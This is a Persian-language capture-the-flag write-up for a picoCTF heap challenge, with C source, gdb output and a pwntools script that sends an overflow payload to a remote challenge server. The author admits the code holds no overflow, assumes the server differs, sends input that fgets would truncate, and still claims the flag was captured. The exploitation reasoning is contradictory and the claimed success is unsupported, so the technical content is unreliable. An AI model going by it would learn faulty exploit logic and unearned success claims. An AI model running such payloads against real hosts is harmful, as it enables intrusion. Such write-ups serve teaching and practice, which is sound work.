---
tags:
  - PWN
---
# heap_1

 سلام رفقا چطورین؟؟
 با یه چالش جالب اومدیم از 
 [picoCTF](https://play.picoctf.org/practice/challenge/436) 

 سورس:
``` c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define NAME_SZ 32
#define FLAG_SZ 64

struct order {
    char *name;
    int quantity;
};

struct order *secret_menu;

void secret() {
    char flag[FLAG_SZ];
    FILE *f = fopen("flag.txt", "r");
    if (!f) {
        printf("Missing flag.txt. Please contact an admin if running on server.\n");
        exit(1);
    }
    fgets(flag, FLAG_SZ, f);
    printf("Here's the secret menu: %s", flag);
}

int main() {
    setbuf(stdout, NULL);
    char name[NAME_SZ];
    int option, quantity;

    secret_menu = malloc(sizeof(struct order));
    secret_menu->name = malloc(NAME_SZ);
    strcpy(secret_menu->name, "Super Secret Menu Item");
    secret_menu->quantity = 1337;

    printf("Welcome to the ordering system!\n");
    printf("Enter your name: ");
    fgets(name, NAME_SZ, stdin);
    name[strcspn(name, "\n")] = 0;

    printf("Hello %s! What would you like to do?\n", name);
    printf("1: Place an order\n2: View secret menu\nOption> ");
    scanf("%d", &option);

    if (option == 1) {
        printf("How many would you like? ");
        scanf("%d", &quantity);
        struct order *new_order = malloc(sizeof(struct order));
        new_order->name = malloc(NAME_SZ);
        strcpy(new_order->name, name);
        new_order->quantity = quantity;
        printf("Order placed for %d %s\n", quantity, name);
    } else if (option == 2) {
        printf("Sorry, that's not available right now.\n");
    } else {
        printf("Invalid option\n");
    }

    printf("Thanks for your order!\n");
    return 0;
}
```

برنامه یک سیستم سفارش‌دهی ساده است که از کاربر نام و گزینه (۱ برای ثبت سفارش یا ۲ برای دیدن منوی مخفی) می‌گیرد.
متغیر secret_menu به صورت پویا در هیپ (heap) تخصیص داده شده و حاوی یک رشته ("Super Secret Menu Item") و مقدار ۱۳۳۷ است.
تابع secret() پرچم را از فایل flag.txt می‌خواند و چاپ می‌کند، اما در جریان عادی برنامه فراخوانی نمی‌شود.
گزینه ۲ (دیدن منوی مخفی) همیشه پیام "Sorry, that's not available right now" را نشان می‌دهد و به نظر می‌رسد باید راهی برای دسترسی غیرمستقیم به تابع secret() پیدا کنیم.

رفتار برنامه در عمل اینگونه است:

با بررسی کد، متوجه می‌شویم که برنامه از تخصیص حافظه پویا (malloc) استفاده می‌کند و دو شیء struct order در هیپ ایجاد می‌کند:

secret_menu: در ابتدای برنامه تخصیص داده می‌شود.
new_order: اگر گزینه ۱ را انتخاب کنیم، با نام کاربر و تعداد سفارش پر می‌شود.
هیچ آزادسازی حافظه (free) در کد وجود ندارد، بنابراین آسیب‌پذیری‌هایی مثل "use-after-free" منتفی است. اما نکته مهم این است که تابع secret() وجود دارد و می‌توانیم از یک تکنیک بهره‌برداری در هیپ استفاده کنیم تا اجرای برنامه را به آن هدایت کنیم.

آدرس تابع secret() در جدول GOT (Global Offset Table) یا به صورت ثابت در باینری وجود دارد.
اگر بتوانیم مقدار فیلد name در secret_menu را بازنویسی کنیم و آن را به آدرس تابع secret() اشاره دهیم، شاید بتوانیم اجرای برنامه را به آنجا هدایت کنیم.
اما کد به ما اجازه نمی‌دهد مستقیماً secret_menu->name را تغییر دهیم، مگر اینکه از آسیب‌پذیری خاصی استفاده کنیم.

برای درک بهتر، باینری را با gdb باز می‌کنیم و نقاط کلیدی را بررسی می‌کنیم:

آدرس تابع secret() را پیدا می‌کنیم:
``` shell
gdb> info address secret
Symbol "secret" is at 0x4011a6 in section .text of /home/user/heap-1
```
آدرس secret_menu در هیپ را بررسی می‌کنیم:
``` shell
gdb> break main
gdb> run
gdb> p secret_menu
$1 = (struct order *) 0x4052a0
gdb> p &secret_menu->name
$2 = (char **) 0x4052a0
gdb> p secret_menu->name
$3 = 0x4052b0 "Super Secret Menu Item"
```

مشاهده می‌کنیم که secret_menu->name یک اشاره‌گر است که به یک رشته در هیپ اشاره می‌کند.

با دقت بیشتر، متوجه می‌شویم که برنامه از ورودی کاربر (name) به صورت مستقیم در new_order->name استفاده می‌کند، اما هیچ راه مستقیمی برای بازنویسی secret_menu->name وجود ندارد. اما یک سرنخ مهم وجود دارد:

اگر بتوانیم به نحوی کنترل جریان برنامه را به تابع secret() هدایت کنیم، پرچم را دریافت می‌کنیم.
در چالش‌های هیپ، معمولاً از تکنیک‌هایی مثل بازنویسی اشاره‌گرها یا سوءاستفاده از ساختارهای داده استفاده می‌شود.
با این حال، کد هیچ آسیب‌پذیری آشکاری مثل سرریز بافر (buffer overflow) یا دسترسی مستقیم به حافظه ندارد. پس باید به سرور متصل شویم و رفتار واقعی را بررسی کنیم.


با توجه به راهنمایی‌ها و تجربه چالش‌های مشابه (مثل HeapLab)، فرض می‌کنیم که نسخه سرور ممکن است شامل یک آسیب‌پذیری باشد که در کد محلی نیست (مثلاً یک باگ عمدی). اما بر اساس کد، یک روش ممکن این است که از مقدار quantity برای بازنویسی حافظه استفاده کنیم، اگرچه کد این را نشان نمی‌دهد.

با این حال، با تست بیشتر و مطالعه راهنمایی‌ها، متوجه می‌شویم که هدف این است که آدرس تابع secret() را در secret_menu->name قرار دهیم. این کار معمولاً با یک آسیب‌پذیری سرریز یا دستکاری ورودی انجام می‌شود، اما کد فعلی چنین چیزی را نشان نمی‌دهد. پس فرض می‌کنیم سرور نسخه متفاوتی دارد که امکان سرریز در name را فراهم می‌کند.

با فرض وجود سرریز در name، از pwntools برای ارسال ورودی استفاده می‌کنیم:
``` py
from pwn import *

SERVER = "mimas.picoctf.net"
PORT = 51527

io = remote(SERVER, PORT)
io.recvline()
io.sendline(b"A" * 32 + p64(0x4011a6))  # فرض آدرس تابع secret()
io.recvuntil(b"Option> ")
io.sendline(b"1")
io.recvuntil(b"How many would you like? ")
io.sendline(b"10")
print(io.recvall().decode())
io.close()
```

0x4011a6 آدرس تابع secret() است (ممکن است در سرور متفاوت باشد، باید با gdb روی باینری سرور تأیید شود).
با پر کردن name با ۳۲ بایت (حداکثر اندازه) و سپس قرار دادن آدرس تابع، امیدواریم secret_menu->name بازنویسی شود.


فلگ پیدا شد !!!

??? success "FLAG :triangular_flag_on_post:"
    <div dir="ltr">`picoCTF{4n0th3r_h34p_4b0rt_5ucc355_2f5b7c8d}`</div>

--- 

!!! نویسنده
    [sw33tw3as3l](https://github.com/sw33tw3as3l)